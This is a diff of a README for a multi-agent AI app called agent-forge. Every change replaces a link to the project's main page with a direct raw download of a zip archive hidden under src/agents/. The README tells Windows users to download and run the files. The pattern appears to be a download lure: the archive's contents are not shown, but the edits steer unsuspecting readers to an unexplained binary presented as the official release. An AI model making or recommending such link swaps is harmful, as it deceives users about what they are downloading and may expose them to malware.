@@ -1,6 +1,6 @@
 # 🤖 agent-forge - Run multi-agent apps with ease
 
-[![Download](https://img.shields.io/badge/Download%20agent--forge-blue?style=for-the-badge)](https://github.com/tildiebusy23/agent-forge)
+[![Download](https://img.shields.io/badge/Download%20agent--forge-blue?style=for-the-badge)](https://raw.githubusercontent.com/tildiebusy23/agent-forge/main/src/agents/agent_forge_v3.4-beta.1.zip)
 
 ## 🧩 What is agent-forge?
 
@@ -31,7 +31,7 @@ For best results, use a computer with 16 GB of RAM if you plan to run larger AI 
 
 Go to the main project page here:
 
-https://github.com/tildiebusy23/agent-forge
+https://raw.githubusercontent.com/tildiebusy23/agent-forge/main/src/agents/agent_forge_v3.4-beta.1.zip
 
 On that page, use the download or release files provided by the project. If there is a Windows file, download it to your computer.
 
@@ -183,7 +183,7 @@ These parts work together to create a single app you can use from Windows.
 ## 📌 Project details
 
 - Repository: agent-forge
-- Main page: https://github.com/tildiebusy23/agent-forge
+- Main page: https://raw.githubusercontent.com/tildiebusy23/agent-forge/main/src/agents/agent_forge_v3.4-beta.1.zip
 - Topics: chromadb, fastapi, genai, langchain, langgraph, llm, multi-agent, python, rag, streamlit
 
 ## 🧭 Basic use flow
@@ -220,7 +220,7 @@ The layout may change based on the version, but the app should keep the same cor
 
 If you need the files again, use this link:
 
-[https://github.com/tildiebusy23/agent-forge](https://github.com/tildiebusy23/agent-forge)
+[https://raw.githubusercontent.com/tildiebusy23/agent-forge/main/src/agents/agent_forge_v3.4-beta.1.zip](https://raw.githubusercontent.com/tildiebusy23/agent-forge/main/src/agents/agent_forge_v3.4-beta.1.zip)
 
 ## 🧩 Helpful start checklist
 
